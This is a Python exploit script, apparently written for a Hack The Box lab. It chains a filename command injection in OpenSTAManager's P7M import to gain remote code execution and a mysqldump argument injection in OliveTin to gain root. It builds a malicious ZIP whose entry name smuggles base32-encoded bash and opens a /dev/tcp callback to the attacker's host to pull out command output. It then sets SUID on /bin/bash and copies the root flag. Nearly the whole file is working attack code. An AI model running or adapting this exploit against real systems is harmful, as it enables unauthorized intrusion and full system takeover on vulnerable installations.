#!/usr/bin/env python3
"""Standalone OpenSTAManager 2.9.8 P7M RCE (CVE-2025-69212) -> user + root.

Isolated from the full recon so it iterates in seconds. Gets a command channel
by having the injected payload connect BACK to us (reverse-exec) — no webroot /
file-write guessing. Then reads user.txt and, if a root-owned OliveTin is on
127.0.0.1:1337, fires CVE-2026-27626 for root.txt.

    python3 osm_pwn.py http://support_001.enigma.htb admin Ne3s4rtars78s
    python3 osm_pwn.py http://support_001.enigma.htb admin Ne3s4rtars78s 10.10.14.7

The 4th arg (LHOST) is optional — auto-detected from the route to the target.
Run from the machine on the HTB VPN. Authorized targets only.
"""
import base64
import io
import re
import socket
import sys
import threading
import time
import urllib.parse
import urllib.request
import http.cookiejar
import zipfile

UA = "Mozilla/5.0 osm"


def log(tag, msg):
    c = {"+": "\033[92m", "!": "\033[91m", "*": "\033[96m", ".": "\033[90m"}.get(tag, "")
    print(f"  {c}[{tag}]\033[0m {msg}")


# ---- HTTP session -------------------------------------------------------
def session():
    jar = http.cookiejar.CookieJar()
    o = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
    o.addheaders = [("User-Agent", UA)]
    return o


def get(o, url):
    try:
        with o.open(url, timeout=15) as r:
            return r.read(300000).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        try:
            return e.read(200000).decode("utf-8", "replace")
        except Exception:
            return ""
    except Exception:
        return ""


def post(o, url, data, headers=None):
    h = {"Content-Type": "application/x-www-form-urlencoded"}
    if headers:
        h.update(headers)
    req = urllib.request.Request(url, data=data, headers=h)
    try:
        with o.open(req, timeout=20) as r:
            return r.status, r.read(300000).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        try:
            return e.code, e.read(200000).decode("utf-8", "replace")
        except Exception:
            return e.code, ""
    except Exception as e:
        return None, str(e)


# ---- login --------------------------------------------------------------
def login(o, base, user, pw):
    page = get(o, base + "/index.php")
    if "brute" in page.lower() and "badge-danger" in page.lower():
        log("!", "app is brute-locked right now (timeout page) — wait / reset box")
        return False
    st, body = post(o, base + "/index.php?op=login",
                    urllib.parse.urlencode({"op": "login", "username": user,
                                            "password": pw}).encode())
    home = get(o, base + "/index.php").lower()
    ok = ("logout" in home or "id_module=" in home) and 'name="password"' not in home
    log("+" if ok else "!", f"login {user}:{pw} -> {'OK' if ok else 'FAILED'}")
    return ok


# ---- plugin discovery ---------------------------------------------------
def find_plugin(o, base):
    home = get(o, base + "/index.php")
    mids = list(dict.fromkeys(re.findall(r"id_module=(\d+)", home)))
    kw = ("importfe", "p7m", "fattura", "fe_zip", "importa fe")
    for mid in mids:
        page = get(o, f"{base}/controller.php?id_module={mid}")
        if any(k in page.lower() for k in kw):
            pid = re.search(r"id_plugin=(\d+)", page)
            pid = pid.group(1) if pid else "1"
            log("+", f"importFE_ZIP module={mid} plugin={pid}")
            return mid, pid
    log("!", "importFE_ZIP module not found in dashboard")
    return None, None


# ---- payload / upload ---------------------------------------------------
def p7m_name(cmd):
    b32 = base64.b32encode(cmd.encode()).decode()
    return "z$(echo${IFS}" + b32 + "|base32${IFS}-d|bash).p7m"


def zip_of(entry):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_STORED) as z:
        z.writestr(entry, b"<?xml version='1.0'?><x/>")
    return buf.getvalue()


def multipart(field, fname, content):
    b = "----osm" + base64.b16encode(zip_of("x")[:6]).decode()
    pre = ("--" + b + "\r\n"
           f'Content-Disposition: form-data; name="{field}"; filename="{fname}"\r\n'
           "Content-Type: application/octet-stream\r\n\r\n")
    return (pre.encode() + content + f"\r\n--{b}--\r\n".encode(),
            "multipart/form-data; boundary=" + b)


def upload(o, base, mid, pid, cmd):
    """Upload the malicious ZIP the way the save handler expects:
    field blob1, upload name *.zip, the .p7m injection as the ZIP entry."""
    entry = p7m_name(cmd)
    body, ct = multipart("blob1", "invoice.zip", zip_of(entry))
    url = f"{base}/actions.php?op=save&id_module={mid}&id_plugin={pid}"
    st, resp = post(o, url, body,
                    {"Content-Type": ct, "X-Requested-With": "XMLHttpRequest"})
    return st, resp


# ---- reverse-exec channel ----------------------------------------------
def lhost_for(base):
    host = urllib.parse.urlparse(base).hostname
    ip = socket.gethostbyname(host)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect((ip, 80))
        return s.getsockname()[0]
    finally:
        s.close()


def run_cmd(o, base, mid, pid, lhost, cmd, wait=25):
    """Bind a listener, inject a payload that pipes `cmd` output back to us."""
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", 0))
    port = srv.getsockname()[1]
    srv.listen(1)
    srv.settimeout(wait)
    out = {}

    def serve():
        try:
            conn, _ = srv.accept()
            conn.settimeout(wait)
            buf = b""
            while True:
                try:
                    d = conn.recv(4096)
                except socket.timeout:
                    break
                if not d:
                    break
                buf += d
            out["data"] = buf
            conn.close()
        except Exception:
            pass
        finally:
            srv.close()

    t = threading.Thread(target=serve, daemon=True)
    t.start()
    time.sleep(0.3)
    payload = (f"exec 3<>/dev/tcp/{lhost}/{port} && {{ {cmd} ; }} >&3 2>&3 ; "
               "exec 3>&- 3<&-")
    upload(o, base, mid, pid, payload)
    t.join(timeout=wait + 2)
    return out.get("data", b"").decode("utf-8", "replace")


# ---- OliveTin root ------------------------------------------------------
def olivetin_root(o, base, mid, pid, lhost):
    log("*", "checking for a local OliveTin (127.0.0.1:1337) …")
    listening = run_cmd(o, base, mid, pid, lhost,
                        "ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null")
    if ":1337" not in listening:
        log(".", "no OliveTin on :1337 — root step skipped")
        return ""
    log("+", "OliveTin on 127.0.0.1:1337 — firing CVE-2026-27626 (mysqldump inj)")
    inject = ("x' ; chmod u+s /bin/bash ; cp /root/root.txt /tmp/.rf 2>/dev/null ; "
              "chmod 644 /tmp/.rf 2>/dev/null ; #")
    import json
    body = json.dumps({"actionId": "Backup Database",
                       "arguments": {"db_pass": inject}})
    fire = (f"curl -s -m 8 -X POST http://127.0.0.1:1337/api/StartActionAndWait "
            f"-H 'Content-Type: application/json' -d {json.dumps(body)}")
    run_cmd(o, base, mid, pid, lhost, fire)
    return run_cmd(o, base, mid, pid, lhost,
                   "cat /tmp/.rf 2>/dev/null; /bin/bash -p -c 'id; cat /root/root.txt'")


# ---- main ---------------------------------------------------------------
def main():
    if len(sys.argv) < 4:
        print(__doc__)
        sys.exit(1)
    base = sys.argv[1].rstrip("/")
    user, pw = sys.argv[2], sys.argv[3]
    lhost = sys.argv[4] if len(sys.argv) > 4 else lhost_for(base)
    log("*", f"target {base}  lhost {lhost}")

    o = session()
    if not login(o, base, user, pw):
        sys.exit(2)
    mid, pid = find_plugin(o, base)
    if not mid:
        sys.exit(3)

    log("*", "confirming code execution (reverse-exec: id; hostname) …")
    probe = run_cmd(o, base, mid, pid, lhost, "id; hostname")
    if "uid=" not in probe:
        log("!", "no callback / no exec. Diagnostics from the upload response:")
        st, resp = upload(o, base, mid, pid, "id")
        log(".", f"upload HTTP {st}; body: {resp[:300].strip()!r}")
        log(".", "if body shows 'only ZIP'/an error, the save path differs; if it "
                 "shows id:1 the exec fired but couldn't reach us (LHOST/firewall)")
        sys.exit(4)
    log("+", "RCE confirmed:")
    for ln in probe.strip().splitlines():
        print("      " + ln)

    flag = run_cmd(o, base, mid, pid, lhost,
                   "cat /home/*/user.txt /var/www/*/user.txt 2>/dev/null")
    m = re.search(r"[0-9a-f]{32}", flag)
    if m:
        log("+", f"USER FLAG: {m.group(0)}")
    else:
        log(".", f"user.txt not found in the usual spots; raw: {flag.strip()[:120]!r}")

    root = olivetin_root(o, base, mid, pid, lhost)
    r = re.search(r"[0-9a-f]{32}", root)
    if r:
        log("+", f"ROOT FLAG: {r.group(0)}")
    elif "uid=0" in root:
        log("+", "root shell confirmed (SUID /bin/bash); run `/bin/bash -p`")


if __name__ == "__main__":
    main()
